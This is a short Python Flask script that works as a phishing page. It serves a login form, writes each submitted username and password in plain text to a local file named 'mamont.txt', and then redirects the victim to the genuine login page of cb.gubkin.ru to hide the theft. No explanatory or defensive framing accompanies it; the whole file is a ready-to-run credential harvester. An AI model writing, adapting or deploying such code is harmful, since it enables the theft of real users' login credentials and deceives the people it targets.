from flask import Flask, render_template, request, redirect, url_for


app = Flask(__name__)

@app.route("/")
def main():
    return redirect(url_for('login'))

@app.route("/login", methods=("GET", "POST"))
def login():
    if request.method == "POST":
        with open('mamont.txt', 'a') as file:
            username = request.form.get("username")
            password = request.form.get("password")
            file.write(f'{username} {password}\n')
        return redirect('https://cb.gubkin.ru/login')
    return render_template("index.html")

app.run()
